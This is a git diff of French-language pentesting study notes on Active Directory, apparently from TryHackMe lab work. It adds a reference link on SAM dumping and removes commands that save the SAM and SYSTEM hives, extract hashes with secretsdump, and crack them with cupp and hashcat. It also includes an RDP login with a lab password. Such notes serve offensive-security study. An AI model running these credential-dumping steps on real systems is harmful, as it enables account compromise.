@@ -46,8 +46,12 @@ NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
 response = LMv2 | CC | NTv2 | CC*
 ```
 
+### Dumping 
+
 SAM -> local
 NTDS.DIT -> BDD des utilisateurs de l'AD
+
+- https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets
 
 **PTH -> possession du hash NT**
 
@@ -130,30 +134,6 @@ xfreerdp /v:10.10.222.63 /u:THM\Mark /p:M4rk3t1ng.21
 
 - http://attack.mitre.org/techniques/T1003/002/
 - https://youtu.be/L26Xq7m0uQ0
-
-### Victim AD
-
-```powershell
-#administrator
-reg save HKLM\sam ./sam.save
-reg save HKLM\system ./system.save
-```
-
-### Offline
-
-```bash
-#hashes.txt
-impacket-secretsdump -sam sam.save -system system.save LOCAL
-```
-
-```bash
-# interactive mode - cracking wordlist based on victim info
-cupp -i
-```
-
-```bash
-hashcat -m 1000 hashes.txt wordlist.txt
-```
 
 ### Shell
 
